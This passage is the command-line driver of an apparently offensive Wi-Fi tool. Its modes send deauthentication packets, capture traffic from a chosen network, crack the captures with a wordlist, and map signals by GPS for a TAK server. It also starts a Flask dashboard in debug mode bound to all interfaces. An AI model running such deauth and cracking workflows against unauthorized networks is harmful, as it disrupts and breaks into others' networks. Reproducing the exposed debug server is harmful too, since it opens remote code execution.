        help="TAK server port (Default is 8087 for TCP, 8088 for UDP)"
    )
    map_group.add_argument(
        "-tak-protocol", "--tak-protocol",
        metavar="<TAK_PROTOCOL>",
        type=str,
        choices=['tcp', 'udp'],
        default='tcp',
        required=False,
        help="TAK connection protocol: 'tcp' or 'udp' (Default is 'tcp')"
    )
    map_group.add_argument(
        "-tak-cert", "--tak-cert",
        metavar="<TAK_CERT_FILE>",
        type=str,
        default=None,
        required=False,
        help="Path to client certificate file for TAK authentication (PEM format)"
    )
    map_group.add_argument(
        "-tak-key", "--tak-key",
        metavar="<TAK_KEY_FILE>",
        type=str,
        default=None,
        required=False,
        help="Path to client private key file for TAK authentication (PEM format)"
    )
    map_group.add_argument(
        "-tak-ca", "--tak-ca",
        metavar="<TAK_CA_FILE>",
        type=str,
        default=None,
        required=False,
        help="Path to CA certificate file for TAK server verification (PEM format)"
    )
    map_group.add_argument(
        "-tak-token", "--tak-token",
        metavar="<TAK_API_TOKEN>",
        type=str,
        default=None,
        required=False,
        help="API token for TAK authentication (alternative to certificates)"
    )

    # Parse known args first to allow -h/--help/--version without requiring --mode
    if any(arg in sys.argv for arg in ['-h', '--help', '--version']):
        # Temporarily make --mode not required for help/version
        mode_arg = None
        for action in parser._actions:
            if action.dest == 'mode':
                mode_arg = action
                break
        if mode_arg:
            original_required = mode_arg.required
            mode_arg.required = False
            parser.parse_args()
            mode_arg.required = original_required
        else:
            parser.parse_args()
        sys.exit(0)
    args = parser.parse_args()

    # Enforce that --headless is only valid with auto modes
    if args.headless and not args.mode.endswith("-auto"):
        parser.error("--headless is only allowed with '-auto' modes.")
    # Prevent unlimited attempts in headless mode
    if args.headless:
        if hasattr(args, 'target_search_attempts') and args.target_search_attempts == 0:
            parser.error("Unlimited target search attempts (0) is not allowed in headless mode.")
        if hasattr(args, 'target_attempts') and args.target_attempts == 0:
            parser.error("Unlimited capture attempts (0) is not allowed in headless mode.")
        if hasattr(args, 'map_scans') and args.map_scans == 0:
            parser.error("Unlimited map scans (0) is not allowed in headless mode.")
    # Remove --target-id requirement for --mode track
    if args.target_id and not args.mode in ["target"]:
        parser.error("--target-id can only be used with 'target' mode.")
    if args.mode == "target" and not args.target_id:
        parser.error("--target-id is required when using 'target' mode.")

    if args.headless and not is_running_under_nohup():
        reexec_with_nohup()
    
    # overwatch branch: no interactive CLI REPL. --mode is required for every
    # invocation (dashboard mode, or any direct mode for pct exec debugging).
    if not args.mode:
        parser.error("--mode is required (interactive CLI removed in the overwatch branch). "
                     "Use --mode dashboard, or a specific mode for direct/debug invocation.")

    try:
        if '-' in args.mode:
            mode_type, mode_subtype = args.mode.split('-')
        else:
            mode_type, mode_subtype = args.mode, None

        # Dashboard mode: start the consolidated dashboard/control panel
        # Don't create suite instance here - dashboard will create its own
        if mode_type == "dashboard":
            from mifi_dashboard import app
            print("Starting MiFi Dashboard at http://localhost:5000 ...")
            app.run(debug=True, host="0.0.0.0", port=5000)
            sys.exit(0)
        
        # Create suite instance only for non-dashboard modes
        suite = wifi_cracker()
        suite.verbose = args.verbose  # Apply global verbose setting
        suite.debug = args.debug if hasattr(args, 'debug') else False  # Apply debug setting
        suite.headless = args.headless

        # Set wordlist and check only for process or full mode
        if mode_type in ["process", "full"]:
            suite.word_list = args.word_list
            if not os.path.isfile(suite.word_list):
                parser.error(f"Wordlist not found at path: {suite.word_list}")

        suite.log(f"MiFi VERSION {__version__}", prefix="blank")
        suite.log(f"MODE: {args.mode}", prefix="blank")

        suite.initial_config()

        # Print mode-specific parameters
        def print_mode_parameters():
            if mode_type == "collect":
                suite.log(f"{args.mode} parameters:", prefix="config")
                suite.log(f"Search:", indent=4, prefix="dot")
                suite.log(f"Initial scan timeout: {args.initial_scan} seconds", indent=8, prefix="dot")
                suite.log(f"Target:", indent=4, prefix="dot")
                suite.log(f"Target monitor timeout: {args.target_scan} seconds", indent=8, prefix="dot")
                suite.log(f"Deauth packets: {args.packets}", indent=8, prefix="dot")
            elif mode_type == "target":
                suite.log(f"{args.mode} parameters:", prefix="config")
                suite.log(f"Target ESSID: {args.target_id}", indent=4, prefix="dot")
                suite.log(f"Search:", indent=4, prefix="dot")
                suite.log(f"Target search attempts: {args.target_search_attempts}", indent=8, prefix="dot")
                suite.log(f"Target scan timeout: {args.initial_scan} seconds", indent=8, prefix="dot")
                suite.log(f"Target:", indent=4, prefix="dot")
                suite.log(f"Capture attempts: {args.target_attempts}", indent=8, prefix="dot")
                suite.log(f"Target monitor timeout: {args.target_scan} seconds", indent=8, prefix="dot")
                suite.log(f"Deauth packets: {args.packets}", indent=8, prefix="dot")
            elif mode_type == "full":
                suite.log(f"{args.mode} parameters:", prefix="config")
                suite.log(f"Search:", indent=4, prefix="dot")
                suite.log(f"Initial scan timeout: {args.initial_scan} seconds", indent=8, prefix="dot")
                suite.log(f"Target:", indent=4, prefix="dot")
                suite.log(f"Target monitor timeout: {args.target_scan} seconds", indent=8, prefix="dot")
                suite.log(f"Deauth packets: {args.packets}", indent=8, prefix="dot")
                suite.log(f"Wordlist: {args.word_list}", indent=4, prefix="dot")
            elif mode_type == "process":
                suite.log(f"{args.mode} parameters:", prefix="config")
                suite.log(f"Wordlist: {args.word_list}", indent=4, prefix="dot")
            elif mode_type == "map":
                suite.log(f"{args.mode} parameters:", prefix="config")
                suite.log(f"Max scans: {args.map_scans}", indent=4, prefix="dot")
                suite.log(f"Mapping scan duration: {args.map_scan_duration} seconds", indent=4, prefix="dot")
                suite.log(f"GPS lock attempts: {args.gps_lock_attempts}", indent=4, prefix="dot")
                suite.log(f"GPS lock wait: {args.gps_lock_wait} seconds", indent=4, prefix="dot")
                if args.gps_port:
                    suite.log(f"GPS port: {args.gps_port}", indent=4, prefix="dot")

        print_mode_parameters()

        if mode_type == "config":
            suite.configure_interface()

        elif mode_type == "collect":
            suite.collect(
                mode=mode_subtype,
                packets=args.packets,
                target_scan=args.target_scan,
                initial_scan=args.initial_scan
            )

        elif mode_type == "process":
            suite.process_all(mode=mode_subtype, word_list=args.word_list)
        
        elif mode_type == "full":
            suite.collect(
                mode=mode_subtype,
                target_essid=args.target_id,
                target_scan_attempts=args.target_search_attempts,
                capture_attempts=args.target_attempts,
                packets=args.packets,
                target_scan=args.target_scan,
                initial_scan=args.initial_scan
            )
            suite.process_all(mode=mode_subtype, word_list=args.word_list)
        
        elif mode_type == "target":
            suite.collect(
                target_essid=args.target_id,
                target_scan_attempts=args.target_search_attempts,
                capture_attempts=args.target_attempts,
                packets=args.packets,
                target_scan=args.target_scan,
                initial_scan=args.initial_scan
            )
        
        elif mode_type == "map":
            # Auto-detect GPS device if not provided or if default doesn't exist
            gps_device = args.gps_port if args.gps_port else None
            if not gps_device or (gps_device == "/dev/ttyUSB0" and not os.path.exists("/dev/ttyUSB0")):
                # Try to detect actual GPS device
                usb_devices = []
                try:
                    usb_devices = glob.glob('/dev/ttyUSB*') + glob.glob('/dev/ttyACM*')
                    usb_devices = [d for d in usb_devices if d and os.path.exists(d)]
                    if usb_devices:
                        gps_device = usb_devices[0]
                        suite.log(f"Auto-detected GPS device: {gps_device}", indent=4, prefix="check")
                except Exception:
                    pass
            
            # Use default if still not found
            if not gps_device:
                gps_device = "/dev/ttyUSB0"
            
            # Check if GPS polling is already active (from parent process/dashboard)
            # GPS should only be controlled by the GPS toggle button, not by individual modes
            # However, subprocesses need their own GPS polling thread to connect to gpsd
            gps_started_by_map_mode = False
            gps_active_from_parent = os.environ.get('MIFI_GPS_ACTIVE', '0') == '1'
            if suite.gps_thread and suite.gps_thread.is_alive():
                suite.log("GPS polling already active from parent process - reusing existing connection", indent=4, prefix="check")
            elif gps_active_from_parent:
                # GPS is active in parent process - subprocess still needs its own thread to poll gpsd
                # The parent manages GPS toggle, but subprocess needs to connect to gpsd for data
                suite.log("GPS is active in parent process - starting GPS polling thread for subprocess", indent=4, prefix="check")
                if not suite.start_gps_polling(gps_device=gps_device):
                    suite.log("Cannot proceed without gpsd. Please start gpsd and try again.", prefix="x")
                    sys.exit(1)
                gps_started_by_map_mode = True  # Track that we started it, but don't stop it (parent manages it)
            else:
                # GPS not active - map mode can't work without GPS
                suite.log("GPS not active. Please enable GPS via dashboard toggle or CLI 'gps' command first.", prefix="warning")
                # For CLI compatibility, allow starting GPS if not in dashboard mode
                # Start GPS polling (gps3) - pass GPS device for error messages
                if not suite.start_gps_polling(gps_device=gps_device):
                    suite.log("Cannot proceed without gpsd. Please start gpsd and try again.", prefix="x")
                    sys.exit(1)
                gps_started_by_map_mode = True
            # gps_serial/init_gps removed in overwatch branch — gps3 via gpsd is the only path
            
            # TAK: Initialize TAK connection if enabled (CLI args override config/config.ini)
            # TAK should work independently in CLI mode - no dependency on dashboard
            if args.tak or suite.tak_enabled:
                # Environment variable not set - TAK will be initialized if enabled
                # This means TAK is not connected in the dashboard, so map mode needs its own connection
                # Initialize TAK connection if enabled (CLI args override config/config.ini)
                # Only initialize if not already connected via environment
                # CLI arguments override config/config.ini values
                tak_host = args.tak_host if args.tak_host else suite.tak_host
                tak_port = args.tak_port if args.tak_port else suite.tak_port
                tak_protocol = args.tak_protocol if args.tak_protocol else suite.tak_protocol
                tak_cert = args.tak_cert if args.tak_cert else suite.tak_cert_file
                tak_key = args.tak_key if args.tak_key else suite.tak_key_file
                tak_ca = args.tak_ca if args.tak_ca else suite.tak_ca_file
                tak_token = args.tak_token if args.tak_token else suite.tak_api_token
                
                if not tak_host:
                    suite.log("TAK host required. Configure in config/config.ini [TAK] section or use -tak-host flag.", prefix="x")
                    sys.exit(1)
                
                suite.log("Initializing TAK server connection...", prefix="config")
                tak_connected = suite.init_tak_connection(
                    host=tak_host,
                    port=tak_port,
                    protocol=tak_protocol,
                    cert_file=tak_cert,
                    key_file=tak_key,
                    ca_file=tak_ca,
                    api_token=tak_token
                )
                
                if not tak_connected:
                    suite.log("", prefix="blank")
                    suite.log("TAK Server connection failed. Troubleshooting steps:", prefix="x")
                    suite.log("", prefix="blank")
                    suite.log("1. Verify TAK server is running and accessible:", indent=4, prefix="dot")
                    suite.log(f"   ping {tak_host}", indent=8, prefix="dot")
                    suite.log(f"   telnet {tak_host} {tak_port}", indent=8, prefix="dot")
                    suite.log("", prefix="blank")
                    suite.log("2. Check network connectivity and firewall rules:", indent=4, prefix="dot")
                    suite.log(f"   Ensure port {tak_port} is open and accessible", indent=8, prefix="dot")
                    suite.log("", prefix="blank")
                    if tak_cert or tak_key:
                        suite.log("3. Verify certificate files exist and are readable:", indent=4, prefix="dot")
                        if tak_cert:
                            suite.log(f"   Certificate: {tak_cert} {'[OK]' if os.path.exists(tak_cert) else '[NOT FOUND]'}", indent=8, prefix="dot")
                        if tak_key:
                            suite.log(f"   Private Key: {tak_key} {'[OK]' if os.path.exists(tak_key) else '[NOT FOUND]'}", indent=8, prefix="dot")
                        if tak_ca:
                            suite.log(f"   CA Certificate: {tak_ca} {'[OK]' if os.path.exists(tak_ca) else '[NOT FOUND]'}", indent=8, prefix="dot")
                        suite.log("", prefix="blank")
                    suite.log("4. Check config/config.ini [TAK] section or CLI arguments:", indent=4, prefix="dot")
                    suite.log(f"   Host: {tak_host}", indent=8, prefix="dot")
                    suite.log(f"   Port: {tak_port}", indent=8, prefix="dot")
                    suite.log(f"   Protocol: {tak_protocol.upper()}", indent=8, prefix="dot")
                    suite.log("", prefix="blank")
                    suite.log("5. Review TAK server logs for connection attempts", indent=4, prefix="dot")
                    suite.log("", prefix="blank")
                    suite.log("6. Test connection manually:", indent=4, prefix="dot")
                    suite.log(f"   telnet {tak_host} {tak_port}", indent=8, prefix="dot")
                    suite.log(f"   # Or use: nc -zv {tak_host} {tak_port}", indent=8, prefix="dot")
                    suite.log("", prefix="blank")
                    suite.log("For detailed setup instructions, see: tak/TAK_SERVER_SETUP.md", indent=4, prefix="dot")
                    suite.log("", prefix="blank")
                    suite.log("Cannot proceed without TAK connection. Exiting.", prefix="x")
                    sys.exit(1)
            # Ensure interface is configured
            suite.configure_interface()
            # Start signal mapping
            # NEVER close TAK connection - TAK is managed by the dashboard toggle
            # TAK connection should only be closed when the user toggles it off
            # Map mode should use existing TAK connection, not create/close its own
            # NEVER stop GPS polling - GPS is managed by the GPS toggle button/dashboard
            # GPS polling should only start/stop via the GPS toggle, not by individual modes
            # Map mode should only use existing GPS polling, never stop it
            # Removed GPS stop logic - GPS is persistent and managed separately
            success = suite.start_signal_tracking(
                max_attempts=args.map_scans,
                scan_interval=args.map_scan_duration,
                gps_lock_attempts=args.gps_lock_attempts,
                gps_lock_wait=args.gps_lock_wait
            )
        
        elif mode_type == "clean":
            suite.clean_mode()

        suite.log(f"Mode: {args.mode} COMPLETE", prefix="blank")
    except KeyboardInterrupt:
        if 'suite' in locals():
            suite.log("", prefix="blank")
            suite.log("Program interrupted by user (Ctrl+C). Shutting down...", prefix="exited")
            suite.clean()
        else:
            print("\n[!] Program interrupted by user (Ctrl+C). Shutting down...")
        sys.exit(0)
    finally:
        if 'suite' in locals():
            suite.clean()
